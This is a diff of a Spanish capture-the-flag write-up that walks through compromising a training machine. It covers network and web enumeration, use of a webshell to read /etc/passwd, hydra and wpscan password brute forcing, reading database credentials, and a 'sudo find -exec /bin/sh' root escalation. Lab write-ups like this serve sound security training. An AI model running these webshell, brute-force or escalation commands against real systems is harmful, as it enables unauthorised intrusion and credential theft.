@@ -1,5 +1,5 @@
 ---
-Estado: En Curso
+Estado: Completado
 Plataforma: The Hackers Labs
 SO: Linux
 Dificultad: Principiante
@@ -7,40 +7,40 @@ VectorInicial: Webshell discovery
 ServicioInicial: HTTP
 PuertoInicial: 80
 Credenciales:
- - debian:12345
- - mermeladita:pepitU
- - mysql root:12345
+  - debian: 12345
+  - mermeladita: pepitU
+  - mysql root: 12345
 Usuarios:
- - debian
- - mermeladita
- - root
+  - debian
+  - mermeladita
+  - root
 Privesc: sudo find
 Tecnicas:
- - Network Discovery
- - Directory Enumeration
- - WordPress Enumeration
- - Webshell Discovery
- - Command Execution
- - User Enumeration
- - Password Brute Force
- - Credential Reuse
- - Database Enumeration
- - Privilege Escalation
+  - Network Discovery
+  - Directory Enumeration
+  - WordPress Enumeration
+  - Webshell Discovery
+  - Command Execution
+  - User Enumeration
+  - Password Brute Force
+  - Credential Reuse
+  - Database Enumeration
+  - Privilege Escalation
 Herramientas:
- - arp-scan
- - gomap
- - gobuster
- - wpscan
- - hydra
- - mysql
+  - arp-scan
+  - gomap
+  - gobuster
+  - wpscan
+  - hydra
+  - mysql
 Fecha: 2026-03-05
 ---
-<img width="800" height="800" alt="Pasted image 20260305084513" src="https://github.com/user-attachments/assets/c5017655-7887-42c9-b1bd-8f8924da6b6a" />
+![[../../attachments/Pasted image 20260305084513.png|697]]
 
 Empezaremos con el descubrimiento de la red para ver donde se encuentra la maquina objetivo.
 
 ```bash
-é sudo arp-scan -I eth0 --localnet
+ sudo arp-scan -I eth0 --localnet
 Interface: eth0, type: EN10MB, MAC: 08:00:27:62:44:c6, IPv4: 10.0.11.11
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
@@ -51,22 +51,22 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.869 seconds (136.97 hosts/sec). 3 responded
 ```
 
-Sabiendo que la direcci├│n es **10.0.11.14** procederemos a la enumeraci├│n de puertos abiertos y ver posibles vectores de entrada e informaci├│n.
+Sabiendo que la dirección es **10.0.11.14** procederemos a la enumeración de puertos abiertos y ver posibles vectores de entrada e información.
 
 ```bash
-settarget 10.0.11.14
+ settarget 10.0.11.14
 TARGET establecido: 10.0.11.14
 
-gomap -p - $TARGET 
+ gomap -p - $TARGET 
 
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
- ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
-  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
+  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
+ ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
+ ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
+ ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+ ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
+  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 
-­ Scanning 10.0.11.14 (65535 ports)
+🎯 Scanning 10.0.11.14 (65535 ports)
 
 PORT    STATE 
 22      open  
@@ -75,18 +75,18 @@ PORT    STATE
 Host Exposure Summary
 - 10.0.11.14 | open ports: 2 | critical: ssh | exposure: medium
 
-Ô£ô Completed scan in 40.912s | hosts: 1 | open ports: 2
+✓ Completed scan in 40.912s | hosts: 1 | open ports: 2
 
-gomap -s -p 22,80 $TARGET
+ gomap -s -p 22,80 $TARGET
 
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
- ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
-  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
+  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
+ ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
+ ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
+ ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+ ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
+  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 
-­ Scanning 10.0.11.14 (2 ports)
+🎯 Scanning 10.0.11.14 (2 ports)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u7
@@ -95,16 +95,16 @@ PORT    STATE  SERVICE         VERSION
 Host Exposure Summary
 - 10.0.11.14 | open ports: 2 | critical: ssh | exposure: medium
 
-Ô£ô Completed scan in 61ms | hosts: 1 | open ports: 2
+✓ Completed scan in 61ms | hosts: 1 | open ports: 2
 ```
 
 Obtenemos 2 puertos abiertos:
-- 22 para conexi├│n *ssh*
-- 80 para conexi├│n *http* para web
+- 22 para conexión *ssh*
+- 80 para conexión *http* para web
 
 Veamos que tipo de web nos encontramos.
 
-Nos encontramos con una web est├ítica, pero tiene un formulario abajo del todo para buscar ciudades que al usarlo nos arroja un error de no encontrar el destino.
+Nos encontramos con una web estática, pero tiene un formulario abajo del todo para buscar ciudades que al usarlo nos arroja un error de no encontrar el destino.
 
 ```http
 http://10.0.11.14/mermelada.php?zona=madrid
@@ -112,10 +112,10 @@ http://10.0.11.14/mermelada.php?zona=madrid
 
 Pero ademas vemos que esta pidiendo los datos mediante **URL** esto puede suponer un vector de ataque.
 
-Antes de abordarlo continuaremos con una enumeraci├│n de directorios y ficheros.
+Antes de abordarlo continuaremos con una enumeración de directorios y ficheros.
 
 ```bash
-é gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
+ gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -160,45 +160,45 @@ Curiosamente dentro de *uploads* hay un fichero llamado *compras.txt* con el sig
 [+] Mermelada de mango
 ```
 
-Este texto nos da una pista que puede ser una contrase├▒a, pero de momento la apuntamos.
+Este texto nos da una pista que puede ser una contraseña, pero de momento la apuntamos.
 
-En la carpeta de *wordpress* nos encontramos que esta todo mal dise├▒ado, eso indica un dominio y al intentar hacer click en algunos enlaces lo confirmamos.
+En la carpeta de *wordpress* nos encontramos que esta todo mal diseñado, eso indica un dominio y al intentar hacer click en algunos enlaces lo confirmamos.
 
 ```http
 http://mermelada.thl/wordpress
 ```
 
-A├▒adamos este dominio a nuestro */etc/hosts*
+Añadamos este dominio a nuestro */etc/hosts*
 
 ```bash
-é sudo nano /etc/hosts
+ sudo nano /etc/hosts
 
-é cat /etc/hosts                                                                                                  
-ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö¼ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
-       Ôöé File: /etc/hosts
-ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö╝ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
-   1   Ôöé 127.0.0.1   localhost
-   2   Ôöé 127.0.1.1   jd-sec.intracof.local   jd-sec
-   3   Ôöé 
-   4   Ôöé # The following lines are desirable for IPv6 capable hosts
-   5   Ôöé ::1     localhost ip6-localhost ip6-loopback
-   6   Ôöé ff02::1 ip6-allnodes
-   7   Ôöé ff02::2 ip6-allrouters
-   8   Ôöé 
-   9   Ôöé 10.0.11.14 mermelada.thl
-ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔö┤ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+ cat /etc/hosts                                                                                                  
+───────┬─────────────────────────────────────────────────────────────────────────
+       │ File: /etc/hosts
+───────┼─────────────────────────────────────────────────────────────────────────
+   1   │ 127.0.0.1   localhost
+   2   │ 127.0.1.1   jd-sec.intracof.local   jd-sec
+   3   │ 
+   4   │ # The following lines are desirable for IPv6 capable hosts
+   5   │ ::1     localhost ip6-localhost ip6-loopback
+   6   │ ff02::1 ip6-allnodes
+   7   │ ff02::2 ip6-allrouters
+   8   │ 
+   9   │ 10.0.11.14 mermelada.thl
+───────┴─────────────────────────────────────────────────────────────────────────
 ```
 
 Ahora veamos si podemos encontrar algo interesante.
 
-A simple vista no hay nada interesante as├¡ que usaremos herramientas de consola como **wpscan**.
+A simple vista no hay nada interesante así que usaremos herramientas de consola como **wpscan**.
 
 ```bash
-é wpscan --url http://mermelada.thl//wordpress/ -e u,p --plugins-detection aggressive
+ wpscan --url http://mermelada.thl//wordpress/ -e u,p --plugins-detection aggressive
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ┬«
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
@@ -336,21 +336,21 @@ Interesting Finding(s):
  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2477
  |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/3eddc03d-ecff-4b50-a574-7b6b62e53af0
  |
- | [!] Title: Comments ÔÇô wpDiscuz < 7.6.19 - Authenticated (Contributor+) Stored Cross-Site Scripting
+ | [!] Title: Comments – wpDiscuz < 7.6.19 - Authenticated (Contributor+) Stored Cross-Site Scripting
  |     Fixed in: 7.6.19
  |     References:
  |      - https://wpscan.com/vulnerability/607da7a6-c2f2-4a9e-9471-8e0d29f355d9
  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35681
  |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/005bf2f0-892f-4248-afe3-263ae3d2ac54
  |
- | [!] Title: Comments ÔÇô wpDiscuz < 7.6.22 - Unauthenticated HTML Injection
+ | [!] Title: Comments – wpDiscuz < 7.6.22 - Unauthenticated HTML Injection
  |     Fixed in: 7.6.22
  |     References:
  |      - https://wpscan.com/vulnerability/66542876-77ae-442d-acde-2aac642f1d36
  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6704
  |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/fa3501a4-7975-4f90-8037-f8a06c293c07
  |
- | [!] Title: Comments ÔÇô wpDiscuz < 7.6.25 - Authentication Bypass
+ | [!] Title: Comments – wpDiscuz < 7.6.25 - Authentication Bypass
  |     Fixed in: 7.6.25
  |     References:
  |      - https://wpscan.com/vulnerability/b95d9907-2c2d-4187-b902-d67262ea6b6d
@@ -364,7 +364,7 @@ Interesting Finding(s):
  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-59591
  |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/16308adf-b5d0-4519-8b1e-3d200003e8be
  |
- | [!] Title: Comments ÔÇô wpDiscuz < 7.6.40 - Unauthenticated Account Takeover
+ | [!] Title: Comments – wpDiscuz < 7.6.40 - Unauthenticated Account Takeover
  |     Fixed in: 7.6.40
  |     References:
  |      - https://wpscan.com/vulnerability/21bc9b41-a967-42dc-9916-bb993b05709c
@@ -404,12 +404,12 @@ Interesting Finding(s):
 
 Por un lado tenemos el plugin vulnerable **wpDiscuz** y por el otro el usuario **mermeladita**, ademas de un *directory listing* para el **upload**.
 
-Como ten├¡amos una posible contrase├▒a del fichero *compras.txt* vamos a probar la combinaci├│n en los puntos de entrada a ver si obtenemos algo.
+Como teníamos una posible contraseña del fichero *compras.txt* vamos a probar la combinación en los puntos de entrada a ver si obtenemos algo.
 
-Pero no conseguimos nada, lo que me dio a pensar en que se parec├¡a demasiado a un *base64* y lo probe.
+Pero no conseguimos nada, lo que me dio a pensar en que se parecía demasiado a un *base64* y lo probe.
 
 ```bash
-é echo 'dW4gcGlxdWl0bz8K' | base64 -d
+ echo 'dW4gcGlxdWl0bz8K' | base64 -d
 un piquito?
 ```
 
@@ -418,11 +418,11 @@ Parece que la curiosidad mato al gato, pero hay lo tenemos.
 Vamos a por *wordpress* con un ataque de diccionario.
 
 ```bash
-é wpscan --url http://mermelada.thl//wordpress/ -U mermeladita -P /usr/share/wordlists/rockyou.txt                                           
+ wpscan --url http://mermelada.thl//wordpress/ -U mermeladita -P /usr/share/wordlists/rockyou.txt                                           
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ┬«
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
@@ -452,7 +452,7 @@ _______________________________________________________________
 Scan Aborted: Canceled by User
 ```
 
-Mientras terminaba de realizar el ataque me puse a mirar la carpeta de *upload* ya que tiene un *directory listing* a ver que podemos encontrar y me encontr├® con 3 ficheros interesantes:
+Mientras terminaba de realizar el ataque me puse a mirar la carpeta de *upload* ya que tiene un *directory listing* a ver que podemos encontrar y me encontré con 3 ficheros interesantes:
 
 ```http
 Index of /wordpress/wp-content/uploads/2026/01
@@ -464,7 +464,7 @@ Index of /wordpress/wp-content/uploads/2026/01
 Apache/2.4.65 (Debian) Server at mermelada.thl Port 8
 ```
 
-Al pulsar en cada uno de ellos solo nos muestra `GIF689a;` lo cual nos da a pensar que otra persona consigui├│ subir estos ficheros con una cabecera de `imagen` en un fichero `PHP`, esto indica **payload** con un *cmd* esperando a ser usado.
+Al pulsar en cada uno de ellos solo nos muestra `GIF689a;` lo cual nos da a pensar que otra persona consiguió subir estos ficheros con una cabecera de `imagen` en un fichero `PHP`, esto indica **payload** con un *cmd* esperando a ser usado.
 
 ```http
 http://mermelada.thl/wordpress/wp-content/uploads/2026/01/macoduweklgkmvp-1767607866.7342.php?cmd=cat+/etc/passwd
@@ -499,7 +499,7 @@ sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
 debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
 mermeladita:x:1001:1001:mermeladita,,,:/home/mermeladita:/bin/bash
 mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
-┬é
+
 ```
 
 Vemos 2 usuarios destacados, uno es *mermeladita* y el otro es *debian*.
@@ -507,7 +507,7 @@ Vemos 2 usuarios destacados, uno es *mermeladita* y el otro es *debian*.
 Como estamos esperando a que termine `wpscan` usaremos otra consola con **hydra** para atacar el puerto *22* por *ssh*.
 
 ```bash
-é hydra -l debian -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+ hydra -l debian -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:31:59
@@ -517,7 +517,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:31:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 10:32:05
 
-é hydra -l mermeladita -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+ hydra -l mermeladita -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:32:15
@@ -531,12 +531,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 10:32:
 ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
 ```
 
-Parece que tenemos un ganador, nuestro usuario **debian** tiene una contrase├▒a insegura.
+Parece que tenemos un ganador, nuestro usuario **debian** tiene una contraseña insegura.
 
 Vamos a conectarnos a ver que encontramos.
 
 ```bash
-é ssh debian@$TARGET   
+ ssh debian@$TARGET   
 The authenticity of host '10.0.11.14 (10.0.11.14)' can't be established.
 ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
 This host key is known by the following other names/addresses:
@@ -556,7 +556,7 @@ debian@debian:~$ ls
 debian@debian:~$ ls ../mermeladita/
 ls: no se puede abrir el directorio '../mermeladita/': Permiso denegado
 debian@debian:~$ sudo -l
-[sudo] contrase├▒a para debian: 
+[sudo] contraseña para debian: 
 Sorry, user debian may not run sudo on debian.
 debian@debian:~$ find / -perm -4000 2>/dev/null 
 /usr/bin/chsh
@@ -575,7 +575,7 @@ debian@debian:~$
 
 Parece que estamos dentro de la maquina pero no vemos nada a primera vista que nos sirva, tendremos que explorar mas.
 
-Despu├®s de dar vueltas por los directorios nos encontramos con algo interesante:
+Después de dar vueltas por los directorios nos encontramos con algo interesante:
 
 ```bash
 debian@debian:~$ ls -la /opt/
@@ -588,12 +588,12 @@ debian@debian:~$ cat /opt/.credenciales
 Credenciales DB 
 ----------------------------------------------------------------
 [+] Usuario DB -----> wwwuser
-[+] Contrase├▒a DB --> micontrase├▒a
+[+] Contraseña DB --> micontraseña
 ----------------------------------------------------------------
 debian@debian:~$ 
 ```
 
-Esto puede ser una pista, as├¡ que intentaremos ver el fichero `wp-config` a ver si tienen los mismos datos o no.
+Esto puede ser una pista, así que intentaremos ver el fichero `wp-config` a ver si tienen los mismos datos o no.
 
 ```bash
 debian@debian:~$ cat /var/www/html/wordpress/wp-config.php 
@@ -718,11 +718,11 @@ MariaDB [mermelada]> quit
 Bye
 ```
 
-Bueno parece que tenemos una contrase├▒a, as├¡ que vamos a usarla para ver si podemos cambiar de usuario.
+Bueno parece que tenemos una contraseña, así que vamos a usarla para ver si podemos cambiar de usuario.
 
 ```bash
 debian@debian:~$ su mermeladita               
-Contrase├▒a: 
+Contraseña: 
 mermeladita@debian:/home/debian$ cd
 mermeladita@debian:~$ ls
 user.txt
@@ -740,7 +740,7 @@ User mermeladita may run the following commands on debian:
     (ALL : ALL) NOPASSWD: /usr/bin/find
 ```
 
-Veamos si en [GtfoBins](https://gtfobins.org/gtfobins/find/) hay una opci├│n para escalar desde `find`.
+Veamos si en [GtfoBins](https://gtfobins.org/gtfobins/find/) hay una opción para escalar desde `find`.
 
 ```bash
 mermeladita@debian:~$ sudo find . -exec /bin/sh \; -quit
@@ -752,5 +752,3 @@ congrats.txt  root.txt
 ```
 
 Y con esto obtenemos acceso como **root** y comprometemos la maquina.
-
-
